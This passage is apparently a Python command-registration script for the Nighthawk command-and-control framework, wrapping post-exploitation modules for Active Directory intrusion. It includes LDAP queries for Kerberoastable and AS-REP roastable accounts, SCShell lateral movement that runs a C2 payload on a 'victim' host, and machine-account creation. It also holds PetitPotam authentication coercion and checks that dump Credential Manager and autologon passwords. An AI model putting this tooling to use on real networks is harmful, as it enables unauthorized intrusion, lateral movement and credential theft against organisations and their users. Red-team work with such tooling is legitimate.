# pyright: reportUndefinedVariable=false
import json
import base64
import os 
import tempfile
import time

# region MISC

def replace_quotes(s):
        return s.strip().strip('"').strip("'")

def write_output(notification, file_name: str = "", output_to_console: bool = True, open_in_notepad: bool = False):
    notification = json.loads(notification)
    if open_in_notepad and file_name == "":
        f = tempfile.NamedTemporaryFile(mode="w", encoding="utf-8", suffix=".txt", delete=False)
        file_name = f.name
    elif file_name != "":
        f = open(file_name, "w", encoding="utf-8")
    for output in notification['CommandResponse']['ExecutionResult']['Outputs']:
        line = f"{base64.b64decode(output['buffer']).decode('utf-8', errors='replace')}"
        if output_to_console:
            nighthawk.console_write(CONSOLE_INFO, line)
        if file_name != "":
            f.write(line)
    
    if file_name != "":
        f.close()
    if open_in_notepad: os.startfile(file_name)

def parse_global_params(params):
    res = []
    file_name = ""
    output_to_console = True
    open_in_notepad = False

    if len(params) > 0:
        i = 0
        while i < len(params):
            param = params[i]
            name = param.split(" ", 1)[0].lower()
            if name == "--save-to-file":
                file_name = params[i+1] if i+1 < len(params) else "out.txt"
                i += 1
            elif name == "--suppress-console-output":
                output_to_console = False
            elif name == "--notepad":
                open_in_notepad = True
            else:
                res.append(param)
            i += 1
    return res, file_name, output_to_console, open_in_notepad

def pack_params(*args):
    packer = Packer()

    for param in args:
        if param[0] == "z":
            packer.addstr(param[1:])
        elif param[0] == "i":
            packer.addint32(int(param[1:]))
        elif param[0] == "b":
            packer.addbytes(bytes(param[1:]))
        elif param[0] == "s":
            packer.addshort(int(param[1:]))
        elif param[0] == "Z":
            packer.addwstr(param[1:])
        else:
            nighthawk.console_write(CONSOLE_ERROR, f"Error packing parameteres. Unsupported parameter type for {param}")
            return None

    return packer.getbuffer()

def base_execute_bof(bof_name: str, bof_bin_path: str, save_to_file: str, output_to_console: bool, open_in_notepad: bool, packed_params, info, technique=""):
    with open(nighthawk.script_resource(f"{bof_bin_path}.{info.Agent.ProcessArch}.o"), 'rb') as f:
        bof = f.read()
    bin_name = bof_bin_path.rsplit("/", 1)[-1]
    nighthawk.console_write(CONSOLE_INFO, f"executing {bof_name} BOF")
    notification = api.execute_bof(f"{bin_name}.{info.Agent.ProcessArch}.o", bof, packed_params, "go", False, 0, True, technique, sync=True)
    write_output(notification, save_to_file, output_to_console, open_in_notepad)
    nighthawk.console_write(CONSOLE_INFO, f"Finished executing {bof_name} BOF")

# endregion

# region BOF - ldapsearch
def ldapsearch_param(params, info):
    # Default values
    query = "(objectclass=domain)"
    attributes = "*"
    result_limit = 0
    scope = 3
    hostname = ""
    dn = ""
    ldaps = False
    skip = False

    # Parse args
    if len(params) > 0:
        query = replace_quotes(params[0])
        i = 1
        while i < len(params):
            arg = params[i]
            option = arg.split(" ", 1)[0].lower()
            if len(params) > i+1:
                value = params[i+1]
            else:
                value = ""
            if option == "--attributes":
                attributes = value
                i += 1
            elif option == "--count":
                result_limit = int(value)
                i += 1
            elif option == "--scope":
                scope = int(value)
                i += 1
            elif option == "--hostname":
                hostname = value
                i += 1
            elif option == "--dn":
                dn = value
                i += 1
            elif option == "--ldaps":
                ldaps = True
            else:
                nighthawk.console_write(CONSOLE_ERROR, f"Unknown argument: {arg}")
                nighthawk.console_write(CONSOLE_ERROR, "Usage: ldapsearch <query> [--attributes] [--count] [--scope] [--hostname] [--dn] [--ldaps] [--save-to-file] [--notepad]")
                return None
            i += 1

    # Pack parameters
    packed_params = pack_params(f"z{query}", f"z{attributes}", f"i{result_limit}", f"i{scope}", f"z{hostname}", f"z{dn}", f"i{ldaps}")

    # You can now call your static function
    # static_call(packed_params, info)
    return packed_params

def ldapsearch(params, info):
    command_params, save_to_file, output_to_console, open_in_notepad = parse_global_params(params)
    packed_params = ldapsearch_param(command_params, info)
    if type(packed_params) != bytes:
        return False
    base_execute_bof("ldapsearch", "bin/SA/ldapsearch/ldapsearch", save_to_file, output_to_console, open_in_notepad, packed_params, info)

nighthawk.register_command(ldapsearch, "ldapsearch", "BOF - Perform LDAP search (avantguard script)" , "BOF - Perform LDAP search (avantguard script)", """ldapsearch <query> [--attributes] [--count] [--scope] [--hostname] [--dn] [--ldaps] [--save-to-file] [--notepad]
	with :
		query => the LDAP query to be performed
		--attributes [comma_separated_attributes] => the attributes to retrieve (default: *)
		--count [count] => the result max size (default: None)
		--scope [scope] => the scope to use [1 = BASE, 2 = LEVEL, 3 = SUBTREE] (default: 3)
		--hostname [hostname] => hostname or IP to perform the LDAP connection on (default: automatic DC resolution)
		--dn [dn] => the LDAP query base
		--ldaps => use of ldaps
                --save-to-file [filename] => file to write output to
                --suppress-console-output => suppress output to Nighthawk console
                --notepad => opens in an notepad to search the output
Important - To add in ACLs so Bloodhound can draw relationships between objects (see external BofHound tool), add nTSecurityDescriptor in the attributes list, like so:
ldapsearch <query> --attributes *,ntsecuritydescriptor ...
Useful queries (queries are just an example, edit where necessary to make it OPSEC safe):
- Kerberoastable:\n(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))
- AS-REP Roastable:\n(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))
- Passwords stored with reversible encryption:\n(&(objectClass=user)(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=128))
If this fails with an error about paging not being supported you can try to use nonpagedldapsearch instead (its unregistered but has the same arguments)

THIS IS AN AVANTGUARD SCRIPT""", "ldapsearch (objectclass=domain)")
# endregion

# region BOF - netshares & netsharesAdmin

def netshares(params, info):
    command_params, save_to_file, output_to_console, open_in_notepad = parse_global_params(params)
    host = ""
    admin = False
    for i in range(0, len(command_params)):
        if (command_params[i] == "--admin"):
            admin = True
        else:
            host = command_params[i]
    
    packed_params = pack_params(f"Z{host}", f"i{admin}")
    if type(packed_params) != bytes:
        return False
    base_execute_bof("netshares", "bin/SA/netshares/netshares", save_to_file, output_to_console, open_in_notepad, packed_params, info)

nighthawk.register_command(netshares, "netshares", "BOF - list shares on local or remote computer (avantguard script)" , "BOF - list shares on local or remote computer (avantguard script)", """netshares <\\\\computername> <--admin>
with --admin it finds more info then standard netshares but requires admin

THIS IS AN AVANTGUARD SCRIPT""", "netshares \\\\ws21")

# endregion

# region BOF - adcs_enum

def adcs_enum(params, info):
    command_params, save_to_file, output_to_console, open_in_notepad = parse_global_params(params)
    domain = command_params[0] if len(command_params) > 0 else ""
    packed_params = pack_params(f"Z{domain}")
    if type(packed_params) != bytes:
        return False
    base_execute_bof("adcs_enum", "bin/SA/adcs_enum/adcs_enum", save_to_file, output_to_console, open_in_notepad, packed_params, info)

nighthawk.register_command(adcs_enum, "adcs_enum", "BOF - Enumerates CAs and templates in the AD using Win32 functions (avantguard script)" , "BOF - Enumerates CAs and templates in the AD using Win32 functions (avantguard script)", """adcs_enum <domain> [--notepad]
Summary: This command enumerates the certificate authorities and certificate 
         types (templates) in the Acitive Directory Certificate Services using
         undocumented Win32 functions. It displays basic information as well 
         as the CA cert, flags, permissions, and similar information for the 
         templates.
Usage:   adcs_enum (domain) [--notepad]
		 domain		Optional. Specified domain otherwise uses current domain.

THIS IS AN AVANTGUARD SCRIPT""", "adcs_enum CONTOSO.com")

# endregion

# region BOF - adcs_enum_com

def adcs_enum_com(params, info):
    _, save_to_file, output_to_console, open_in_notepad = parse_global_params(params)
    packed_params = pack_params()  # no parameters for this one
    if type(packed_params) != bytes:
        return False

    base_execute_bof("adcs_enum_com", "bin/SA/adcs_enum_com/adcs_enum_com", save_to_file, output_to_console, open_in_notepad, packed_params, info)

nighthawk.register_command(
    adcs_enum_com,
    "adcs_enum_com",
    "BOF - Enumerates CAs and templates in the AD using ICertConfig COM object (avantguard script)",
    "BOF - Enumerates CAs and templates in the AD using ICertConfig COM object (avantguard script)",
    """adcs_enum_com [--notepad]
Summary: This command enumerates the certificate authorities and certificate 
         types (templates) in the Active Directory Certificate Services using 
         the ICertConfig, ICertRequest, and IX509CertificateTemplate COM 
         objects. It displays basic information as well as the CA cert, flags, 
         permissions, and similar information for the templates.
Usage:   adcs_enum_com [--notepad]

THIS IS AN AVANTGUARD SCRIPT""",
    "adcs_enum_com"
)

# endregion

# region BOF - adcs_enum_com2

def adcs_enum_com2(params, info):
    _, save_to_file, output_to_console, open_in_notepad = parse_global_params(params)
    packed_params = pack_params()  # no parameters for this one
    if type(packed_params) != bytes:
        return False

    base_execute_bof("adcs_enum_com2", "bin/SA/adcs_enum_com2/adcs_enum_com2", save_to_file, output_to_console, open_in_notepad, packed_params, info)

nighthawk.register_command(
    adcs_enum_com2,
    "adcs_enum_com2",
    "BOF - Enumerates CAs and templates in the AD using IX509PolicyServerListManager COM object (avantguard script)",
    "BOF - Enumerates CAs and templates in the AD using IX509PolicyServerListManager COM object (avantguard script)",
    """adcs_enum_com2 [--notepad]
Summary: This command enumerates the certificate authorities and certificate 
         types (templates) in the Active Directory Certificate Services using 
         the IX509PolicyServerListManager, IX509PolicyServerUrl, 
         IX509EnrollmentPolicyServer, ICertificationAuthority, and 
         IX509CertificateTemplate COM objects. It displays basic information as
         well as the CA cert, flags, permissions, and similar information for
         the templates.
Usage:   adcs_enum_com2 [--notepad]

THIS IS AN AVANTGUARD SCRIPT""",
    "adcs_enum_com2"
)

# endregion

# region BOF - routeprint

def routeprint(params, info):
    _, save_to_file, output_to_console, open_in_notepad = parse_global_params(params)
    packed_params = pack_params()  # no parameters for this one
    if type(packed_params) != bytes:
        return False

    base_execute_bof("routeprint", "bin/SA/routeprint/routeprint", save_to_file, output_to_console, open_in_notepad, packed_params, info)

nighthawk.register_command(routeprint, "routeprint", "BOF - prints ipv4 routes on the machine (avantguard script)", "BOF - prints ipv4 routes on the machine (avantguard script)", """prints ipv4 routes on the machine

THIS IS AN AVANTGUARD SCRIPT""", "routeprint ")

# endregion

# region BOF - ipconfig

def ipconfig(params, info):
    _, save_to_file, output_to_console, open_in_notepad = parse_global_params(params)
    packed_params = pack_params()  # no parameters for this one
    if type(packed_params) != bytes:
        return False

    base_execute_bof("ipconfig", "bin/SA/ipconfig/ipconfig", save_to_file, output_to_console, open_in_notepad, packed_params, info, technique="T1016")

nighthawk.register_command(
    ipconfig,
    "ipconfig",
    "BOF - Runs an internal ipconfig command (avantguard script)",
    "BOF - Runs an internal ipconfig command (avantguard script)",
    """ipconfig
Summary: Lists out adapters, system hostname, and configured DNS servers.
Usage:   ipconfig

THIS IS AN AVANTGUARD SCRIPT""",
    "ipconfig"
)

# endregion

# region BOF - netGroupList / netGroupListMembers

def netGroupList(params, info):
    """
    Lists groups in this domain (or a specified domain if provided)
    """
    command_params, save_to_file, output_to_console, open_in_notepad = parse_global_params(params)
    type_param = 0 # type == 0 (list groups)
    domain = command_params[0] if len(command_params) > 0 else ""
    group = "" # group is empty
    packed_params = pack_params(f"s{type_param}", f"Z{domain}", f"Z{group}")
    if type(packed_params) != bytes:
        return False

    base_execute_bof("netGroupList", "bin/SA/netgroup/netgroup", save_to_file, output_to_console, open_in_notepad, packed_params, info)

nighthawk.register_command(
    netGroupList,
    "netGroupList",
    "BOF - List Groups in this domain (or specified domain if given) (avantguard script)",
    "BOF - List Groups in this domain (or specified domain if given) (avantguard script)",
    """netGroupList <opt: domainname> [--notepad]
Summary: Lists all groups in this domain or the specified domain.
Usage:   netGroupList [domainname] [--notepad]

THIS IS AN AVANTGUARD SCRIPT""",
    "netGroupList CONTOSO.com"
)


def netGroupListMembers(params, info):
    """
    Lists members of the specified domain group
    """
    command_params, save_to_file, output_to_console, open_in_notepad = parse_global_params(params)
    type_param = 1 # type == 1 (list members)
    group = command_params[0] if len(command_params) > 0 else ""
    domain = command_params[1] if len(command_params) > 1 else ""
    packed_params = pack_params(f"s{type_param}", f"Z{domain}", f"Z{group}")
    if type(packed_params) != bytes:
        return False

    base_execute_bof("netGroupListMembers", "bin/SA/netgroup/netgroup", save_to_file, output_to_console, open_in_notepad, packed_params, info)


nighthawk.register_command(
    netGroupListMembers,
    "netGroupListMembers",
    "BOF - List the members of the specified group in this domain (avantguard script)",
    "BOF - List the members of the specified group in this domain (avantguard script)",
    """netGroupListMembers <Group Name> <opt: domainname> [--notepad]
Summary: Lists the members of the specified group in this domain or another domain.
Usage:   netGroupListMembers "Domain Admins" CONTOSO.com [--notepad]

THIS IS AN AVANTGUARD SCRIPT""",
    "netGroupListMembers \"Domain Admins\" CONTOSO.com"
)

# endregion

# region BOF - netLocalGroupList / netLocalGroupListMembers

def netLocalGroupList(params, info):
    """
    Lists groups in the local server (or specified server if given)
    """
    command_params, save_to_file, output_to_console, open_in_notepad = parse_global_params(params)
    type_param = 0 # type == 0 (list groups)
    server = command_params[0] if len(command_params) > 0 else ""
    group = "" # group is empty
    packed_params = pack_params(f"s{type_param}", f"Z{server}", f"Z{group}")
    if type(packed_params) != bytes:
        return False

    base_execute_bof("netLocalGroupList", "bin/SA/netlocalgroup/netlocalgroup", save_to_file, output_to_console, open_in_notepad, packed_params, info)

nighthawk.register_command(
    netLocalGroupList,
    "netLocalGroupList",
    "BOF - List Groups in this server (or specified server if given) (avantguard script)",
    "BOF - List Groups in this server (or specified server if given) (avantguard script)",
    """netLocalGroupList <opt: servername>
Summary: Lists all local groups in this server or the specified server.
Usage:   netLocalGroupList SERVER01

THIS IS AN AVANTGUARD SCRIPT""",
    "netLocalGroupList SERVER01"
)

def netLocalGroupListMembers(params, info):
    """
    Lists members of the specified local group
    """
    command_params, save_to_file, output_to_console, open_in_notepad = parse_global_params(params)
    type_param = 1 # type == 1 (list members)
    server = command_params[1] if len(command_params) > 1 else ""
    group = command_params[0] if len(command_params) > 0 else ""
    packed_params = pack_params(f"s{type_param}", f"Z{server}", f"Z{group}")
    if type(packed_params) != bytes:
        return False

    base_execute_bof("netLocalGroupListMembers", "bin/SA/netlocalgroup/netlocalgroup", save_to_file, output_to_console, open_in_notepad, packed_params, info)

nighthawk.register_command(
    netLocalGroupListMembers,
    "netLocalGroupListMembers",
    "BOF - List the members of the specified group in this server (avantguard script)",
    "BOF - List the members of the specified group in this server (avantguard script)",
    """netLocalGroupListMembers <Group Name> <opt: servername>
Summary: Lists the members of the specified group in this server or another server.
Usage:   netLocalGroupListMembers "Administrators" SERVER01

THIS IS AN AVANTGUARD SCRIPT""",
    "netLocalGroupListMembers \"Administrators\" SERVER01"
)

# endregion

# region BOF - netLocalGroupListMembers2

def netLocalGroupListMembers2(params, info):
    """
    Lists members of the specified local group (bofhound-compatible output)
    """
    command_params, save_to_file, output_to_console, open_in_notepad = parse_global_params(params)
    type_param = 1 # type == 1 (list members)
    server = command_params[1] if len(command_params) > 1 else ""
    group = command_params[0] if len(command_params) > 0 else ""

    packed_params = pack_params(f"s{type_param}", f"Z{server}", f"Z{group}")
    if type(packed_params) != bytes:
        return False

    base_execute_bof("netLocalGroupListMembers2", "bin/SA/netlocalgroup2/netlocalgroup2", save_to_file, output_to_console, open_in_notepad, packed_params, info)

nighthawk.register_command(
    netLocalGroupListMembers2,
    "netLocalGroupListMembers2",
    "BOF - List the members of the specified group in this server (bofhound compatible, avantguard script)",
    "BOF - List the members of the specified group in this server (bofhound compatible, avantguard script)",
    """netLocalGroupListMembers2 <opt: Group Name> <opt: servername>
Summary: Lists the members of the specified group in this server (or specified server if given).
         Output is compatible with bofhound.
Usage:   netLocalGroupListMembers2 "Administrators" SERVER01

THIS IS AN AVANTGUARD SCRIPT""",
    "netLocalGroupListMembers2 \"Administrators\" SERVER01"
)

# endregion

# region BOF - reg_query / reg_query_recursive

def reg_query(params, info):
    """
    Queries a registry key or value (optionally remote).
    """
    command_params, save_to_file, output_to_console, open_in_notepad = parse_global_params(params)
    if len(command_params) < 2:
        nighthawk.console_write(CONSOLE_ERROR, "Usage: reg_query [hostname] <hive> <path> [value]")
        return False

    # Registry hive mapping like in %reghives
    reghives = {
        "HKLM": 2,
        "HKCU": 1,
        "HKU":  3,
        "HKCR": 0
    }

    hostname = ""
    hive = ""
    path = ""
    key = ""
    recursive_flag = 0

    # Determine if first argument is hostname or hive
    if command_params[0].upper() in reghives:
        # Local machine
        hostname = ""
        hive = reghives[command_params[0].upper()]
        if len(command_params) >= 2:
            path = command_params[1]
        if len(command_params) >= 3:
            key = command_params[2]
    else:
        # Remote host
        hostname = f"\\\\{command_params[0]}"
        if len(command_params) < 2 or command_params[1].upper() not in reghives:
            nighthawk.console_write(CONSOLE_ERROR, "Invalid or missing hive name.")
            return False
        hive = reghives[command_params[1].upper()]
        if len(command_params) >= 3:
            path = command_params[2]
        if len(command_params) >= 4:
            key = command_params[3]

    packed_params = pack_params(f"z{hostname}", f"i{hive}", f"z{path}", f"z{key}", f"i{recursive_flag}")
    if type(packed_params) != bytes:
        return False

    base_execute_bof("reg_query", "bin/SA/reg_query/reg_query", save_to_file, output_to_console, open_in_notepad, packed_params, info)

nighthawk.register_command(
    reg_query,
    "reg_query",
    "BOF - Queries a registry key or value (avantguard script)",
    "BOF - Queries a registry key or value (avantguard script)",
    """reg_query <opt:hostname> <hive> <path> <opt:value>
Summary: Queries a registry key or value on the local or a remote system.
Usage:   reg_query [hostname] <hive> <path> [value]

Valid hives:
  HKLM
  HKCU
  HKU
  HKCR

If a value name is not specified, the key itself is enumerated.

THIS IS AN AVANTGUARD SCRIPT""",
    "reg_query HKLM Software\\Microsoft\\Windows\\CurrentVersion"
)

def reg_query_recursive(params, info):
    """
    Recursively queries registry keys (optionally remote).
    """
    command_params, save_to_file, output_to_console, open_in_notepad = parse_global_params(params)
    if len(command_params) < 2:
        nighthawk.console_write(CONSOLE_ERROR, "Usage: reg_query_recursive [hostname] <hive> <path>")
        return False

    reghives = {
        "HKLM": 2,
        "HKCU": 1,
        "HKU":  3,
        "HKCR": 0
    }

    hostname = ""
    hive = ""
    path = ""
    recursive_flag = 1  # indicates recursion mode

    if command_params[0].upper() in reghives:
        # Local
        hive = reghives[command_params[0].upper()]
        if len(command_params) >= 2:
            path = command_params[1]
    else:
        # Remote
        hostname = f"\\\\{command_params[0]}"
        if len(command_params) < 2 or command_params[1].upper() not in reghives:
            nighthawk.console_write(CONSOLE_ERROR, "Invalid or missing hive name.")
            return False
        hive = reghives[command_params[1].upper()]
        if len(command_params) >= 3:
            path = command_params[2]

    packed_params = pack_params(f"z{hostname}", f"i{hive}", f"z{path}", "z", f"i{recursive_flag}")
    if type(packed_params) != bytes:
        return False

    base_execute_bof("reg_query_recursive", "bin/SA/reg_query/reg_query", save_to_file, output_to_console, open_in_notepad, packed_params, info)

nighthawk.register_command(
    reg_query_recursive,
    "reg_query_recursive",
    "BOF - Recursively queries a registry key (avantguard script)",
    "BOF - Recursively queries a registry key (avantguard script)",
    """reg_query_recursive <opt:hostname> <hive> <path>
Summary: Recursively queries registry keys on the local or a remote system.
Usage:   reg_query_recursive [hostname] <hive> <path>

Valid hives:
  HKLM
  HKCU
  HKU
  HKCR

If a value to query is not specified, the specified key is recursively enumerated.

THIS IS AN AVANTGUARD SCRIPT""",
    "reg_query_recursive HKLM Software\\Microsoft"
)

# endregion

# region BOF - enumLocalSessions

def enumlocalsessions(params, info):
    command_params, save_to_file, output_to_console, open_in_notepad = parse_global_params(params)
    packed_params = pack_params()
    if type(packed_params) != bytes:
        return False

    base_execute_bof("enumlocalsessions", "bin/SA/enumlocalsessions/enumlocalsessions", save_to_file, output_to_console, open_in_notepad, packed_params, info)

nighthawk.register_command(
    enumlocalsessions,
    "enumlocalsessions",
    "BOF - Enumerate the currently attached user sessions both local and over rdp (avantguard script)",
    "BOF - Enumerate the currently attached user sessions both local and over rdp (avantguard script)",
    """enumlocalsessions
Summary: Enumerate the currently attached user sessions both local and over rdp.
Usage:   enumlocalsessions

THIS IS AN AVANTGUARD SCRIPT""",
    "enumlocalsessions"
)

# endregion

# region BOF - probe

def probe(params, info):
    command_params, save_to_file, output_to_console, open_in_notepad = parse_global_params(params)
    port = 0
    server = ""
    if len(command_params) > 1:
        server = command_params[0]
        port = int(command_params[1])
    else:
        nighthawk.console_write(CONSOLE_ERROR, f"!! Usage:   probe <host> <port>")
        return False

    if port < 1 or port > 65535:
        nighthawk.console_write(CONSOLE_ERROR, f"!! Port out of range of 1-65534")
        return False

    packed_params = pack_params(f"z{server}", f"i{port}")
    if type(packed_params) != bytes:
        return False

    base_execute_bof("probe", "bin/SA/probe/probe", save_to_file, output_to_console, open_in_notepad, packed_params, info)

nighthawk.register_command(
    probe,
    "probe",
    "BOF - Test TCP Port (avantguard script)",
    "BOF - Test TCP Port (avantguard script)",
    """probe [Server or IP] [Port]
Summary: Test TCP Port.
Usage:   probe <host> <port>

THIS IS AN AVANTGUARD SCRIPT""",
    "probe 10.0.0.2 445"
)

# endregion

# region BOF - scshell64

def scshell64(params, info):
    with open(nighthawk.script_resource(f"bin/SCShell-master/CS-BOF/scshellbof.{info.Agent.ProcessArch}.o"), 'rb') as f:
        bof = f.read()

    # $target, $service, "C:\\ $+ $exepath"
    target = ""
    service = ""
    exepath = ""
    if len(params) > 2:
        target = params[0]
        service = params[1]
        exepath = params[2]
    else:
        nighthawk.console_write(CONSOLE_ERROR, f"!! Usage:   scshell64 <target> <service> <exepath>")
        return False

    packer = Packer()
    packer.addstr(target)
    packer.addstr(service)
    packer.addstr(exepath)
    packed_params = packer.getbuffer()

    if type(packed_params) != bytes:
        return False

    nighthawk.console_write(CONSOLE_INFO, "executing probe BOF")
    notification = api.execute_bof(
        f"scshellbof.{info.Agent.ProcessArch}.o",
        bof,
        packed_params,
        "go",
        False,
        0,
        True,
        "",
        sync=True
    )
    write_output(notification)

nighthawk.register_command(
    scshell64,
    "scshell64",
    "BOF - Use ChangeServiceConfigA to run Beacon payload (avantguard script)",
    "BOF - Use ChangeServiceConfigA to run Beacon payload (avantguard script)",
    """scshell64 <target> <service> <exepath>
Summary: Use ChangeServiceConfigA to run Beacon payload.
Usage:   scshell64 <target> <service> <exepath>

Excample: scshell64 myvictim.contoso.com defragsvc C:\Windows\System32\avcssvc.exe
Hint: Copy a c2-agent to the remote system \\myvictim\C$\Windows\System32\avcsvc.exe before using this command!

THIS IS AN AVANTGUARD SCRIPT""",
    "scshell64 myvictim.contoso.com defragsvc C:\Windows\System32\avcssvc.exe"
)

# endregion

# region BOF - machine account add/del/get

def add_machine_account(params, info):
    """
    Add a computer account to the Active Directory domain.
    """
    command_params, save_to_file, output_to_console, open_in_notepad = parse_global_params(params)
    if len(command_params) < 2:
        nighthawk.console_write(CONSOLE_ERROR, "Usage: add_machine_account <computername> <password>")
        return False

    computerName = command_params[0]
    password = command_params[1]
    packed_params = pack_params(f"z{computerName}", f"z{password}")
    if type(packed_params) != bytes:
        return False

    base_execute_bof("AddMachineAccount", "bin/MachineAccount/AddMachineAccount/AddMachineAccount", save_to_file, output_to_console, open_in_notepad, packed_params, info)

nighthawk.register_command(
    add_machine_account,
    "add_machine_account",
    "BOF - Add a computer account to the Active Directory domain. (avantguard script)",
    "BOF - Add a computer account to the Active Directory domain. (avantguard script)",
    """add_machine_account <computername> <password>
    Summary: Use Active Directory Service Interfaces (ADSI) to add a computer account to AD.
    Usage: add_machine_account <computername> <password>
    
    THIS IS AN AVANTGUARD SCRIPT""",
    "add_machine_account MYCOMPUTER$ Passw0rd!"
)

def del_machine_account(params, info):
    """
    Remove a computer account from the Active Directory domain.
    """
    command_params, save_to_file, output_to_console, open_in_notepad = parse_global_params(params)
    if len(params) < 1:
        nighthawk.console_write(CONSOLE_ERROR, "Usage: del_machine_account <computername>")
        return False

    computerName = command_params[0]
    packed_params = pack_params(f"z{computerName}")
    if type(packed_params) != bytes:
        return False

    base_execute_bof("DelMachineAccount", "bin/MachineAccount/DelMachineAccount/DelMachineAccount", save_to_file, output_to_console, open_in_notepad, packed_params, info)

nighthawk.register_command(
    del_machine_account,
    "del_machine_account",
    "BOF - Remove a computer account from the Active Directory domain. (avantguard script)",
    "BOF - Remove a computer account from the Active Directory domain. (avantguard script)",
    """del_machine_account <computername>
    Summary: Use Active Directory Service Interfaces (ADSI) to delete a computer account from AD.
    Usage: del_machine_account <computername>
    
    THIS IS AN AVANTGUARD SCRIPT""",
    "del_machine_account MYCOMPUTER$"
)

def get_machine_account_quota(params, info):
    """
    Read the MachineAccountQuota value from the Active Directory domain.
    """
    _, save_to_file, output_to_console, open_in_notepad = parse_global_params(params)
    packed_params = pack_params()
    if type(packed_params) != bytes:
        return False

    base_execute_bof("GetMachineAccountQuota", "bin/MachineAccount/GetMachineAccountQuota/GetMachineAccountQuota", save_to_file, output_to_console, open_in_notepad, packed_params, info)

nighthawk.register_command(
    get_machine_account_quota,
    "get_machine_account_quota",
    "BOF - Read the MachineAccountQuota value from the Active Directory domain. (avantguard script)",
    "BOF - Read the MachineAccountQuota value from the Active Directory domain. (avantguard script)",
    """get_machine_account_quota
    Summary: Use Active Directory Service Interfaces (ADSI) to read the ms-DS-MachineAccountQuota value from AD.
    Usage: get_add_machine_account_quota
    
    THIS IS AN AVANTGUARD SCRIPT""",
    "get_machine_account_quota"
)

# endregion

# region PetitPotam

def petit_potam(params, info):
    """
    Coerce authentication from the target machine to listener machine via the PetitPotam vulnerability.
    """
    command_params, save_to_file, output_to_console, open_in_notepad = parse_global_params(params)
    target_machine = params[0]
    listener_machine = params[1]
    packed_params = pack_params(f"z{target_machine}", f"z{listener_machine}")
    if type(packed_params) != bytes:
        return False

    base_execute_bof("PetitPotam", "bin/Exploit/PetitPotam/PetitPotam", save_to_file, output_to_console, open_in_notepad, packed_params, info)

nighthawk.register_command(
    petit_potam,
    "petit_potam",
    "BOF - Coerce authentication from the target machine to listener machine via the PetitPotam vulnerability. (avantguard script)",
    "BOF - Coerce authentication from the target machine to listener machine via the PetitPotam vulnerability. (avantguard script)",
    """petit_potam
    Summary: Coerce authentication from the target machine to listener machine via MS-EFSRPC EfsRpcOpenFileRaw.
    Usage: petit_potam <targetMachine> <listenerMachine>
    
    THIS IS AN AVANTGUARD SCRIPT""",
    "petit_potam"
)

# endregion

# region PrivCheck

def always_install_elevated_check(params, info):
    """
    Check for AlwaysInstallElevated privilege escalation vulnerability.
    """
    _, save_to_file, output_to_console, open_in_notepad = parse_global_params(params)
    packed_params = pack_params()
    if type(packed_params) != bytes:
        return False

    base_execute_bof("AlwaysInstallElevatedCheck", "bin/PrivCheck/AlwaysInstallElevatedCheck/AlwaysInstallElevatedCheck", save_to_file, output_to_console, open_in_notepad, packed_params, info)
    return True

nighthawk.register_command(
    always_install_elevated_check,
    "always_install_elevated_check",
    "BOF - Check for AlwaysInstallElevated privilege escalation vulnerability. (avantguard script)",
    "BOF - Check for AlwaysInstallElevated privilege escalation vulnerability. (avantguard script)",
    """always_install_elevated_check
    Summary: Checks if AlwaysInstallElevated is enabled in both HKCU and HKLM. This misconfiguration allows any user to install MSI packages with SYSTEM privileges.

    Vulnerability Conditions:
    HKCU\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated = 1
    HKLM\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated = 1
    Both keys must be set to 1 for exploitation.
    Usage: always_install_elevated_check
    
    THIS IS AN AVANTGUARD SCRIPT""",
    "always_install_elevated_check"
)

def autologon_check(params, info):
    """
    Check for stored Autologon credentials in registry.
    """
    _, save_to_file, output_to_console, open_in_notepad = parse_global_params(params)
    packed_params = pack_params()
    if type(packed_params) != bytes:
        return False

    base_execute_bof("AutologonCheck", "bin/PrivCheck/AutologonCheck/AutologonCheck", save_to_file, output_to_console, open_in_notepad, packed_params, info)
    return True

nighthawk.register_command(
    autologon_check,
    "autologon_check",
    "BOF - Check for stored Autologon credentials in registry. (avantguard script)",
    "BOF - Check for stored Autologon credentials in registry. (avantguard script)",
    """autologon_check
    Summary: Checks the Winlogon registry key for stored autologon credentials. If AutoAdminLogon=1 and DefaultPassword is set, credentials are exposed.

    Registry Location:
    HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    Usage: autologon_check
    
    THIS IS AN AVANTGUARD SCRIPT""",
    "autologon_check"
)

def credential_manager_check(params, info):
    """
    Enumerate credentials from Windows Credential Manager.
    """
    _, save_to_file, output_to_console, open_in_notepad = parse_global_params(params)
    packed_params = pack_params()
    if type(packed_params) != bytes:
        return False

    base_execute_bof("CredentialManagerCheck", "bin/PrivCheck/CredentialManagerCheck/CredentialManagerCheck", save_to_file, output_to_console, open_in_notepad, packed_params, info)
    return True

nighthawk.register_command(
    credential_manager_check,
    "credential_manager_check",
    "BOF - Enumerate credentials from Windows Credential Manager. (avantguard script)",
    "BOF - Enumerate credentials from Windows Credential Manager. (avantguard script)",
    """credential_manager_check
    Summary: Enumerates all stored credentials in Windows Credential Manager for the current user context.
    Shows target, username, and password.

    Note:
    Only enumerates credentials for the current user/token.
    Running as SYSTEM will not show user credentials.
    Usage: credential_manager_check
    
    THIS IS AN AVANTGUARD SCRIPT""",
    "credential_manager_check"
)

def hijackable_path_check(params, info):
    """
    Check for writable directories in system PATH.
    """
    _, save_to_file, output_to_console, open_in_notepad = parse_global_params(params)
    packed_params = pack_params()
    if type(packed_params) != bytes:
        return False

    base_execute_bof("HijackablePathCheck", "bin/PrivCheck/HijackablePathCheck/HijackablePathCheck", save_to_file, output_to_console, open_in_notepad, packed_params, info)
    return True

nighthawk.register_command(
    hijackable_path_check,
    "hijackable_path_check",
    "BOF - Check for writable directories in system PATH. (avantguard script)",
    "BOF - Check for writable directories in system PATH. (avantguard script)",
    """hijackable_path_check
    Summary: Enumerates the system PATH environment variable and checks each directory for write permissions. 
    Writable directories in PATH can be abused for DLL hijacking or binary planting.

    Registry Location:
    HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment\Path
    Usage: hijackable_path_check
    
    THIS IS AN AVANTGUARD SCRIPT""",
    "hijackable_path_check"
)

def modifiable_autorun_check(params, info):
    """
    Check for modifiable autorun executables.
